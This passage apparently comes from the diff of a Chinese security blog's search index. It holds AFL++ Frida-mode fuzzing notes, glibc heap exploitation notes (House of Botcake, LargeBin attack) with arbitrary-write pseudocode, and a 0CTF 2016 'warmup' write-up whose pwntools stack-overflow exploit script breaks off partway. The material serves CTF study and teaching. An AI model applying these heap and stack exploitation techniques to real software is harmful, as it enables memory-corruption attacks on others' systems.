class="line"><span class="keyword">const</span> cm = <span class="keyword">new</span> <span class="title class_">CModule</span>(<span class="string">`</span></span><br><span class="line"><span class="string">    extern unsigned char * __afl_fuzz_ptr;</span></span><br><span class="line"><span class="string">    extern unsigned int * __afl_fuzz_len;</span></span><br><span class="line"><span class="string">    extern void testinstr(char *buf, int len);</span></span><br><span class="line"><span class="string">    void fuzz(char *buf, int len) &#123;</span></span><br><span class="line"><span class="string">        __afl_fuzz_ptr[*__afl_fuzz_len] = 0;</span></span><br><span class="line"><span class="string">        testinstr(__afl_fuzz_ptr, *__afl_fuzz_len);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">`</span>, &#123;</span><br><span class="line">    <span class="attr">testinstr</span>: testinstr_addr,</span><br><span class="line">    <span class="attr">__afl_fuzz_ptr</span>: <span class="title class_">Afl</span>.<span class="title function_">getAflFuzzPtr</span>(),</span><br><span class="line">    <span class="attr">__afl_fuzz_len</span>: <span class="title class_">Afl</span>.<span class="title function_">getAflFuzzLen</span>()</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Afl</span>.<span class="title function_">setEntryPoint</span>(cm.<span class="property">fuzz</span>);</span><br><span class="line"><span class="title class_">Afl</span>.<span class="title function_">setPersistentAddress</span>(cm.<span class="property">fuzz</span>);</span><br><span class="line"><span class="title class_">Afl</span>.<span class="title function_">setInMemoryFuzzing</span>();</span><br><span class="line"><span class="title class_">Afl</span>.<span class="title function_">setJsMainHook</span>(cm.<span class="property">fuzz</span>);</span><br><span class="line"><span class="title class_">Afl</span>.<span class="title function_">print</span>(<span class="string">&quot;done&quot;</span>);</span><br><span class="line"><span class="title class_">Afl</span>.<span class="title function_">done</span>();</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Fuzz</category>
-      </categories>
-      <tags>
-        <tag>Fuzz</tag>
-        <tag>Blind-Fuzz</tag>
-        <tag>AFL++</tag>
-        <tag>Frida</tag>
       </tags>
   </entry>
   <entry>
@@ -376,6 +95,241 @@ executed).】</p>
       </tags>
   </entry>
   <entry>
+    <title>AFL++ Frida-Mode: Usecases for testing and debugging</title>
+    <url>/2022/04/07/AFL-Frida-Mode-Usecases-for-testing-and-debugging/</url>
+    <content><![CDATA[<h1 id="fuzzing"><a class="markdownIt-Anchor" href="#fuzzing"></a> Fuzzing</h1>
+<p>明确指明需要加载的<code>AFL_PRELOAD=</code>环境变量值为<code>/usr/local/lib/afl/afl-frida-trace.so</code>、且需要加载的<code>harness</code> javascript文件为<code>afl.js</code>时:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">AFL_PRELOAD=/usr/local/lib/afl/afl-frida-trace.so AFL_FRIDA_JS_SCRIPT=fuzz.js afl-fuzz -D -O -i <span class="keyword">in</span> -o out -t 10000+ -- ./build/test ./build/dummy</span><br></pre></td></tr></table></figure>
+<p>由于<code>afl-frida-trace.so</code>在<code>PATH</code>中，且<code>AFL++ Frida_Mode</code>默认寻找二进制同目录下的<code>afl.js</code>加载。因此以上可简写为：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">afl-fuzz -D -O -i <span class="keyword">in</span> -o out -t 10000+ -- ./build/test ./build/dummy</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>(注意有时在<code>persistent</code>时，有时用<code>dummy input</code>作为输入文件。以防止初始运行时找不到<code>out/default/.cur_input</code>文件而报错)</p>
+</blockquote>
+<p>当需要输出<code>forkserver</code>的子进程的以便调试时：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">AFL_CHILD_DEBUG=1 afl-fuzz -O -D -i <span class="keyword">in</span> -o out -- ./build/testinstr @@</span><br></pre></td></tr></table></figure>
+<h1 id="gdb-debugging"><a class="markdownIt-Anchor" href="#gdb-debugging"></a> GDB Debugging</h1>
+<p>命令如下：</p>
+<p>Example 1: 开启<code>AFL_DEBUG_CHILD</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb \</span><br><span class="line">    --ex <span class="string">&#x27;set environment LD_PRELOAD=/usr/local/lib/afl/afl-frida-trace.so&#x27;</span> \</span><br><span class="line">    --ex <span class="string">&#x27;set environment AFL_FRIDA_JS_SCRIPT=afl.js&#x27;</span> \</span><br><span class="line">    --ex <span class="string">&#x27;set environment AFL_DEBUG_CHILD=1&#x27;</span> \</span><br><span class="line">    --ex <span class="string">&#x27;set disassembly-flavor intel&#x27;</span> \</span><br><span class="line">    --args ./build/testinstr ./build/in/in</span><br></pre></td></tr></table></figure>
+<p>Example 2:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb \</span><br><span class="line">    --ex <span class="string">&#x27;set environment LD_PRELOAD=/usr/local/lib/afl/afl-frida-trace.so&#x27;</span> \</span><br><span class="line">    --ex <span class="string">&#x27;set environment AFL_FRIDA_JS_SCRIPT=afl.js&#x27;</span> \</span><br><span class="line">    --ex <span class="string">&#x27;set disassembly-flavor intel&#x27;</span> \</span><br><span class="line">    --args ./build/testinstr ./build/in/in</span><br></pre></td></tr></table></figure>
+<h1 id="scripting"><a class="markdownIt-Anchor" href="#scripting"></a> Scripting</h1>
+<p>一个简单且方便调试的<code>harness</code>js 脚本如下</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Afl</span>.<span class="title function_">print</span>(<span class="string">&quot;----------------------------------------&quot;</span>);</span><br><span class="line"><span class="title class_">Afl</span>.<span class="title function_">print</span>(<span class="string">&quot;|             4x7 = 28                 |&quot;</span>);</span><br><span class="line"><span class="title class_">Afl</span>.<span class="title function_">print</span>(<span class="string">&quot;----------------------------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Afl</span>.<span class="title function_">print</span>(<span class="string">&quot;pid: &quot;</span> + <span class="title class_">Process</span>.<span class="property">id</span>);</span><br><span class="line"><span class="keyword">const</span> name = <span class="title class_">Process</span>.<span class="title function_">enumerateModules</span>()[<span class="number">0</span>].<span class="property">name</span>;</span><br><span class="line"><span class="title class_">Afl</span>.<span class="title function_">print</span>(<span class="string">`Name: <span class="subst">$&#123;name&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ModuleMap</span>().<span class="title function_">values</span>().<span class="title function_">forEach</span>(<span class="function"><span class="params">m</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="title class_">Afl</span>.<span class="title function_">print</span>(<span class="string">`<span class="subst">$&#123;m.base&#125;</span>-<span class="subst">$&#123;m.base.add(m.size)&#125;</span> <span class="subst">$&#123;m.name&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//address of testinstr</span></span><br><span class="line"><span class="comment">// var testinstr_addr = Module.findExportByName(null, &quot;testinstr&quot;);</span></span><br><span class="line"><span class="comment">// var testinstr_addr = DebugSymbol.forName(&quot;testinstr&quot;).address;</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable language_">module</span> = <span class="title class_">Process</span>.<span class="title function_">enumerateModules</span>()[<span class="number">0</span>];</span><br><span class="line"><span class="title class_">Afl</span>.<span class="title function_">print</span>(<span class="string">&quot;Module.base: &quot;</span> + <span class="variable language_">module</span>.<span class="property">base</span>);</span><br><span class="line"><span class="keyword">const</span> testinstr_addr = <span class="variable language_">module</span>.<span class="property">base</span>.<span class="title function_">add</span>(<span class="number">0x8ca</span>);</span><br><span class="line"><span class="title class_">Afl</span>.<span class="title function_">print</span>(<span class="string">&quot;testinstr_addr: &quot;</span> + testinstr_addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> cm = <span class="keyword">new</span> <span class="title class_">CModule</span>(<span class="string">`</span></span><br><span class="line"><span class="string">    extern unsigned char * __afl_fuzz_ptr;</span></span><br><span class="line"><span class="string">    extern unsigned int * __afl_fuzz_len;</span></span><br><span class="line"><span class="string">    extern void testinstr(char *buf, int len);</span></span><br><span class="line"><span class="string">    void fuzz(char *buf, int len) &#123;</span></span><br><span class="line"><span class="string">        __afl_fuzz_ptr[*__afl_fuzz_len] = 0;</span></span><br><span class="line"><span class="string">        testinstr(__afl_fuzz_ptr, *__afl_fuzz_len);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">`</span>, &#123;</span><br><span class="line">    <span class="attr">testinstr</span>: testinstr_addr,</span><br><span class="line">    <span class="attr">__afl_fuzz_ptr</span>: <span class="title class_">Afl</span>.<span class="title function_">getAflFuzzPtr</span>(),</span><br><span class="line">    <span class="attr">__afl_fuzz_len</span>: <span class="title class_">Afl</span>.<span class="title function_">getAflFuzzLen</span>()</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Afl</span>.<span class="title function_">setEntryPoint</span>(cm.<span class="property">fuzz</span>);</span><br><span class="line"><span class="title class_">Afl</span>.<span class="title function_">setPersistentAddress</span>(cm.<span class="property">fuzz</span>);</span><br><span class="line"><span class="title class_">Afl</span>.<span class="title function_">setInMemoryFuzzing</span>();</span><br><span class="line"><span class="title class_">Afl</span>.<span class="title function_">setJsMainHook</span>(cm.<span class="property">fuzz</span>);</span><br><span class="line"><span class="title class_">Afl</span>.<span class="title function_">print</span>(<span class="string">&quot;done&quot;</span>);</span><br><span class="line"><span class="title class_">Afl</span>.<span class="title function_">done</span>();</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Fuzz</category>
+      </categories>
+      <tags>
+        <tag>Fuzz</tag>
+        <tag>Blind-Fuzz</tag>
+        <tag>AFL++</tag>
+        <tag>Frida</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HeapAttack: House_of_Botcake</title>
+    <url>/2022/03/18/HeapAttack-House-of-Botcake/</url>
+    <content><![CDATA[<h2 id="1-漏洞样式"><a class="markdownIt-Anchor" href="#1-漏洞样式"></a> 1. 漏洞样式</h2>
+<ul>
+<li>glibc版本：≥ 2.3.1</li>
+<li>Tcache：开启</li>
+<li>漏洞要求：double free</li>
+</ul>
+<h2 id="2-利用方法"><a class="markdownIt-Anchor" href="#2-利用方法"></a> 2. 利用方法</h2>
+<h3 id="21-攻击效果"><a class="markdownIt-Anchor" href="#21-攻击效果"></a> 2.1 攻击效果</h3>
+<p>绕过Tcache的 tcache-dup 检查，将 <code>可控chunk</code> 插入 <code>Tcache-list</code>,修改 <code>可控chunk</code> 的 <code>fd</code> 字段，从而 <strong>最终实现</strong> <code>任意地址写</code>’。</p>
+<h3 id="22-攻击过程"><a class="markdownIt-Anchor" href="#22-攻击过程"></a> 2.2 攻击过程</h3>
+<p>伪代码表示如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">size = 0x108</span><br><span class="line"></span><br><span class="line">mem_lst = [ malloc(size) for x in range(7) ] #创建7个chunk</span><br><span class="line"></span><br><span class="line">a = malloc(size) </span><br><span class="line">b = malloc(size)  #a,b chunk是主角</span><br><span class="line"></span><br><span class="line">malloc(0x18) #和top_chunk隔离，防止forward-consolidation</span><br><span class="line"></span><br><span class="line">[free(x) for x in mem_lst] #把7个chunk free到tcache中,tcache被填满</span><br><span class="line"></span><br><span class="line">free(a) #因tcache已满，a、b进unsorted-bin</span><br><span class="line">free(b) #a、b邻接,因此发生consolidate合并成一个chunk在unsorted-bin中</span><br><span class="line"></span><br><span class="line">malloc(size) #一次分配后tcache有一个空位</span><br><span class="line">free(b) #对b使用double-free攻击。由于b不在tcache中，因此通过tcache检查被加入到tcache中。</span><br><span class="line"></span><br><span class="line">c = malloc(size + 0x30) #unsorted-bin发生remaindering，chunk-b的前0x30被memory-c overlap</span><br><span class="line"></span><br><span class="line">payload = size * b&quot;\0&quot; + p64(size) + p64(target_address) </span><br><span class="line">#不同size时的payload写法不同；但目的是target_address覆盖到 b-&gt;fd</span><br><span class="line"></span><br><span class="line">write(c, payload)  ##这里将target_address链接到tcache list中，下次对tcache size的内存请求即可分配到目标地址的内存chunk</span><br><span class="line"></span><br><span class="line">target_memory = malloc(size)</span><br><span class="line">write(target_memory, arbitrary_value)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考：</h3>
+<p><a href="https://github.com/StarCross-Tech/heap_exploit_2.31/blob/master/house_of_botcake.c">heap_exploit_2.31/house_of_botcake.c</a></p>
+]]></content>
+      <categories>
+        <category>HeapAttack</category>
+        <category>tcache</category>
+      </categories>
+      <tags>
+        <tag>HeapAttack</tag>
+        <tag>House_of_Botcake</tag>
+        <tag>tcache</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HeapAttack: LargeBin Attack</title>
+    <url>/2022/03/23/HeapAttack-LargeBinAttack/</url>
+    <content><![CDATA[<h2 id="1-漏洞样式"><a class="markdownIt-Anchor" href="#1-漏洞样式"></a> 1. 漏洞样式</h2>
+<ul>
+<li>漏洞要求：Write After Free</li>
+<li>chunk大小：可申请 large bin(即size&gt;=0x400)</li>
+</ul>
+<h2 id="2-利用方法"><a class="markdownIt-Anchor" href="#2-利用方法"></a> 2. 利用方法</h2>
+<h3 id="21-攻击效果"><a class="markdownIt-Anchor" href="#21-攻击效果"></a> 2.1 攻击效果</h3>
+<p>在unsorted-bin chunk被sort进large-bin时，触发<code>任意地址写</code>, 可以往<code>任意地址</code>中写入一个不可控的未知<code>大数</code> (实际为<code>某堆地址</code>)。<br />
+实现以下目的：</p>
+<ul>
+<li>修改循环次数</li>
+<li>修改global_max_fast 或arena-&gt;max_fast的值，从而把size&gt;0x80的chunk分配到fastbin中;或者在目标二进制使用mallopt(M_MXFAST,0)禁用fastbin后，重新启用</li>
+<li>修改能够输出的变量，从而泄露堆地址</li>
+</ul>
+<h3 id="22-过程简述"><a class="markdownIt-Anchor" href="#22-过程简述"></a> 2.2 过程简述</h3>
+<p>假设堆状态如下：</p>
+<pre><code>unsorted-bin: A(0x400)
+large-bin: 
+0x400： B(0x410) 
+</code></pre>
+<p>若 <strong>B</strong> 存在Write After Free, 则修改 <code>B-&gt;bk_nextsize</code> 为 <code>目标地址(target)</code> 。<br />
+触发A加入到large-bin链表中，则会导致 <code>A-&gt;bk_nextsize = B-&gt;bk_nextsize; A-&gt;bk_nextsize-&gt;fd_nextsize = B</code> 即 <code>target-&gt;fd_nextsize = A</code> 。</p>
+<p>即</p>
+<pre><code>unsorted-bin: 
+large-bin:
+0x400: B(0x410) -&gt; A(0x400) [A插入时触发攻击]
+</code></pre>
+<h3 id="23-代码表示"><a class="markdownIt-Anchor" href="#23-代码表示"></a> 2.3 代码表示</h3>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">static uint64_t target; //假设需要被更改值的目标地址</span><br><span class="line">int attack()&#123;</span><br><span class="line">    void* A, * B, * C;</span><br><span class="line"></span><br><span class="line">    A = malloc(0x400 - 8); //A小</span><br><span class="line">    malloc(0x18);</span><br><span class="line">    B = malloc(0x410 - 8); //B大</span><br><span class="line">    malloc(0x18);</span><br><span class="line"></span><br><span class="line">    free(B);</span><br><span class="line">    // unsortedbin: B</span><br><span class="line">    // largebin: empty</span><br><span class="line"></span><br><span class="line">    malloc(0x600);</span><br><span class="line">    // unsortedbin: empty</span><br><span class="line">    // largebin: 0x400: B(0x410)</span><br><span class="line"></span><br><span class="line">    free(A)；</span><br><span class="line">    // unsortedbin: A</span><br><span class="line">    // largebin: 0x400: B(0x410)</span><br><span class="line"></span><br><span class="line">    * ( uint64_t * )(B + 0x18) = ( uint64_t ) ( &amp;target ) - 0x20</span><br><span class="line">    //edit: B-&gt;bk_nextsize = target_over  &amp;&amp; let: target_over-&gt;fd_nextsize = target</span><br><span class="line"></span><br><span class="line">    malloc(0x600);</span><br><span class="line">    // unsortedbin: empty</span><br><span class="line">    // largebin: 0x400: B(0x410)-&gt;A(0x400) &#123;触发：A-&gt;bk_nextsize-&gt;fd_nextsize = A&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="3-原理分析"><a class="markdownIt-Anchor" href="#3-原理分析"></a> 3. 原理分析</h2>
+<p>在glibc项目malloc.c文件_int_malloc函数中：<br />
+在chunk被从unsortedbin中sort下来之后的代码部分</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">. . . </span><br><span class="line">          /* place chunk in bin */</span><br><span class="line">          //// 若smallbin范围</span><br><span class="line">          if (in_smallbin_range (size))</span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = smallbin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line">            &#125;</span><br><span class="line">          else ////若在largebin范围</span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = largebin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line">              //// largebin:: [bck]: fwd</span><br><span class="line">              /* maintain large bins in sorted order * /</span><br><span class="line">              if (fwd != bck) //// largebin不为空</span><br><span class="line">                &#123;</span><br><span class="line">                  /* Or with inuse bit to speed comparisons */</span><br><span class="line">                  size |= PREV_INUSE;</span><br><span class="line">                  /* if smaller than smallest, bypass loop below */</span><br><span class="line">                  assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">                  if ((unsigned long) (size)</span><br><span class="line">		      &lt; (unsigned long) chunksize_nomask (bck-&gt;bk)) ////确认victim为最小，因此插入到链表最后</span><br><span class="line">                    &#123;</span><br><span class="line">                      fwd = bck;</span><br><span class="line">                      bck = bck-&gt;bk;</span><br><span class="line">                      //// largebin:: [fwd]: bck</span><br><span class="line">                      //// 等同于2节例子中：[av]: B </span><br><span class="line"></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd; ////fwd-&gt;fd 即为bck,也就是例子里的B</span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize; //// 因此victim-&gt;bk_nextsize = bck-&gt;bk_nextsize (即A-&gt;bk_nextsize = B-&gt;bk_nextsize)</span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line"> ////即bck-&gt;bk_nextsize = bck-&gt;bk_nextsize-&gt;fd_nextsize = victim</span><br><span class="line"> ////即例子：B-&gt;bk_nextsize = B-&gt;bk_nextsize-&gt;fd_nextsize = A</span><br><span class="line"> ////==&gt; largebin attack的精髓即：B-&gt;bk_nextsize-&gt;fd_nextsize = A， </span><br><span class="line"> ////==&gt; 而它通过两步计算得到：victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize; 和 victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    &#125;</span><br></pre></td></tr></table></figure>
+<h3 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h3>
+<p><a href="https://github.com/StarCross-Tech/heap_exploit_2.31/blob/master/largebin_attack.c">heap_exploit_2.31/largebin_attack.c</a></p>
+]]></content>
+      <categories>
+        <category>HeapAttack</category>
+      </categories>
+      <tags>
+        <tag>HeapAttack</tag>
+        <tag>LargeBinAttack</tag>
+        <tag>Arbitrary Write</tag>
+        <tag>Write After Free</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>WriteUp: 0CTF 2016 warmup</title>
+    <url>/2022/04/13/WriteUp-0CTF-2016-warmup/</url>
+    <content><![CDATA[<h1 id="0x0-checksec"><a class="markdownIt-Anchor" href="#0x0-checksec"></a> 0x0 Checksec</h1>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+<h1 id="0x1-reverse-enginnering"><a class="markdownIt-Anchor" href="#0x1-reverse-enginnering"></a> 0x1 Reverse Enginnering</h1>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0804815A ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:0804815A</span><br><span class="line">.text:0804815A</span><br><span class="line">.text:0804815A stackoverflow   proc near               ; CODE XREF: start+2B↑p</span><br><span class="line">.text:0804815A</span><br><span class="line">.text:0804815A fd              = dword ptr -30h</span><br><span class="line">.text:0804815A addr            = dword ptr -2Ch</span><br><span class="line">.text:0804815A len             = dword ptr -28h</span><br><span class="line">.text:0804815A var_20          = byte ptr -20h</span><br><span class="line">.text:0804815A</span><br><span class="line">.text:0804815A                 sub     esp, 30h</span><br><span class="line">.text:0804815D                 mov     [esp+30h+fd], 0 ; fd</span><br><span class="line">.text:08048164                 lea     eax, [esp+30h+var_20]</span><br><span class="line">.text:08048168                 mov     [esp+30h+addr], eax ; addr</span><br><span class="line">.text:0804816C                 mov     [esp+30h+len], 34h ; len</span><br><span class="line">.text:08048174                 call    read</span><br><span class="line">.text:08048179                 mov     [esp+30h+fd], 1 ; fd</span><br><span class="line">.text:08048180                 mov     [esp+30h+addr], offset aGoodLuck ; &quot;Good Luck!\n&quot;</span><br><span class="line">.text:08048188                 mov     [esp+30h+len], 0Bh ; len</span><br><span class="line">.text:08048190                 call    write</span><br><span class="line">.text:08048195                 mov     eax, 0DEADBEAFh</span><br><span class="line">.text:0804819A                 mov     ecx, 0DEADBEAFh</span><br><span class="line">.text:0804819F                 mov     edx, 0DEADBEAFh</span><br><span class="line">.text:080481A4                 mov     ebx, 0DEADBEAFh</span><br><span class="line">.text:080481A9                 mov     esi, 0DEADBEAFh</span><br><span class="line">.text:080481AE                 mov     edi, 0DEADBEAFh</span><br><span class="line">.text:080481B3                 mov     ebp, 0DEADBEAFh</span><br><span class="line">.text:080481B8                 add     esp, 30h</span><br><span class="line">.text:080481BB                 retn</span><br><span class="line">.text:080481BB stackoverflow   endp</span><br></pre></td></tr></table></figure>
+<p>漏洞点在于：<code>frame stack</code>大小为<code>0x30</code>; <code>read</code>写入的变量为<code>var_20</code>，其内存位置为：<code>[esp+30h+var_20]</code>即<code>[esp + 0x30 - 0x20]</code>,因此<code>var_20</code>变量若写入内容超过<code>0x20</code>, 则会发生<code>stack overflow</code>. 在该函数中，读取的<code>len</code>为<code>0x34</code>，明显超过<code>0x20</code>,即发生<code>stack overflow</code>，覆盖<code>ret address</code>,污染控制流.</p>
+<h1 id="0x2-analyze"><a class="markdownIt-Anchor" href="#0x2-analyze"></a> 0x2 Analyze</h1>
+<p>该题目的<code>stack overflow</code>很容发现，利用也毫无难点。但该函数为<code>静态编译</code>，且其中用<code>int 0x80</code>的方式调用<code>system call</code>。由于该文件体简单且小，又无<code>libc.so</code>等库，因此无法找出有效可用的<code>rop chain</code>.</p>
+<p>该题目中使用了<code>int 0x80</code>的方式进行<code>read</code>和<code>write</code>, 且有良好布局<code>system call</code>调用的代码片段，如下：<br />
+(<code>.text:0804812</code>2 -&gt; <code>.text:08048134</code>)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0804811D read            proc near               ; CODE XREF: stackoverflow+1A↓p</span><br><span class="line">.text:0804811D</span><br><span class="line">.text:0804811D fd              = dword ptr  4</span><br><span class="line">.text:0804811D addr            = dword ptr  8</span><br><span class="line">.text:0804811D len             = dword ptr  0Ch</span><br><span class="line">.text:0804811D</span><br><span class="line">.text:0804811D                 mov     eax, 3</span><br><span class="line">.text:08048122                 mov     ebx, [esp+fd]   ; fd </span><br><span class="line">.text:08048126                 mov     ecx, [esp+addr] ; addr</span><br><span class="line">.text:0804812A                 mov     edx, [esp+len]  ; len</span><br><span class="line">.text:0804812E                 int     80h             ; LINUX - sys_read</span><br><span class="line">.text:08048130                 test    eax, eax</span><br><span class="line">.text:08048132                 js      short sub_804814D</span><br><span class="line">.text:08048134                 retn</span><br><span class="line">.text:08048134 read            endp</span><br><span class="line">.text:08048134</span><br></pre></td></tr></table></figure>
+<p>若能控制<code>eax</code>的值，则能达到调用任意<code>system_call</code>函数的目的。</p>
+<p>因此两种思路：</p>
+<ul>
+<li>使用<code>system</code>函数
+<blockquote>
+<p>设置<code>eax = 0xb</code>, 调用 <code>execve(&quot;/bin/sh&quot;)</code></p>
+</blockquote>
+</li>
+<li>使用<code>open-read-write</code>链
+<blockquote>
+<p><code>open(&quot;flag&quot;, 0); //eax = 5</code><br />
+<code>read(3, buffer, len); //eax = 3</code><br />
+<code>write(1, buffer, len); // eax = 4</code><br />
+其中<code>read</code>,<code>write</code>在二进制中都有完整的函数可用，不必自己重新构造。</p>
+</blockquote>
+</li>
+</ul>
+<p>控制<code>eax</code>的思路为使用<code>alarm</code>函数。<br />
+第一次调用<code>alarm</code>时，设定发送<code>SIGALRM</code>信号的时间；第二次调用<code>alarm</code>时，将会把前一次<code>alarm</code>***剩余的***时间返回。</p>
+<blockquote>
+<p>注意是<code>剩余的</code>时间而非<code>流失的</code>时间。</p>
+</blockquote>
+<p>但由于在该题目中，首次调用<code>alarm</code>设定的时间为<code>10</code>秒，小于<code>system('/bin/sh')</code>所需要的<code>0xb</code>,因此只能采用<code>open-read-write</code>链。</p>
+<h1 id="0x3-exploit-code"><a class="markdownIt-Anchor" href="#0x3-exploit-code"></a> 0x3 Exploit Code</h1>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.util <span class="keyword">import</span> misc</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">&quot;warmup&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;split&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">gs = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">continue</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.GDB:</span><br><span class="line">        p = process(elf.path)</span><br><span class="line">        cmd = [<span class="string">&quot;gdb&quot;</span>, <span class="string">&quot;-p&quot;</span>, <span class="built_in">str</span>(p.pid)]</span><br><span class="line">        cmd = context.terminal + cmd</span><br><span class="line">        cmd = <span class="string">&#x27; &#x27;</span>.join(cmd) </span><br><span class="line">        os.system(cmd)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> p</span><br><span class="line">    <span class="keyword">elif</span> args.REMOTE:</span><br><span class="line">        <span class="keyword">return</span> remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25353</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> process(elf.path)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------- Process Interactive ---------------------</span></span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line">io.timeout = <span class="number">30</span></span><br><span class="line">tic = time.time()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Welcome to 0CTF 2016!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">alarm = <span class="number">0x804810D</span></span><br><span class="line">read = <span class="number">0x804811D</span></span><br><span class="line">write = <span class="number">0x08048135</span> </span><br><span class="line">stackoverlow = <span class="number">0x804815A</span></span><br><span class="line"></span><br><span class="line">mov_esp_bcd_int = <span class="number">0x8048122</span> </span><br><span class="line"><span class="string">&quot;&quot;&quot; 设置eax后,ebx,ecx,edx都从栈上读出,即可调用system_call</span></span><br><span class="line"><span class="string">.text:08048122                 mov     ebx, [esp+4]    </span></span><br><span class="line"><span class="string">.text:08048126                 mov     ecx, [esp+8]  </span></span><br><span class="line"><span class="string">.text:0804812A                 mov     edx, [esp+12]   </span></span><br><span class="line"><span class="string">.text:0804812E                 int     80h              </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 从vmmap中，找到一块可写内存，用来保存flag文件路径和内容。</span></span><br><span class="line">buffer = <span class="number">0x8049600</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##### 1.  read flag path into buffer</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x20</span> </span><br><span class="line">payload += p32(read)    <span class="comment">#stackoverlow return address</span></span><br><span class="line">payload += p32(stackoverlow)    <span class="comment">#read return address</span></span><br><span class="line">payload += p32(<span class="number">0</span>)       <span class="comment">#fd</span></span><br><span class="line">payload += p32(buffer)  <span class="comment">#addr</span></span><br><span class="line">payload += p32(<span class="number">6</span>)       <span class="comment">#len</span></span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="keyword">if</span> args.GDB:</span><br><span class="line">    ctn = io.recvuntil(<span class="string">b&quot;Good Luck!\n&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ctn = io.recvline()</span><br><span class="line">io.send(<span class="string">b&quot;flag\0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">##### 2.  open flag file; </span></span><br><span class="line"><span class="comment"># system_call open &gt;&gt; eax:0x5; ebx:char* file_name; ecx: flags; edx: mode</span></span><br><span class="line"><span class="comment"># 第二次调用alarm函数，会返回距离第一次调用alarm 剩余的时间(秒)</span></span><br><span class="line"></span><br><span class="line">toc = time.time()</span><br><span class="line"><span class="comment"># time.sleep(5) ### alarm设置10秒，sleep 5秒，剩余5秒</span></span><br><span class="line">log.info(<span 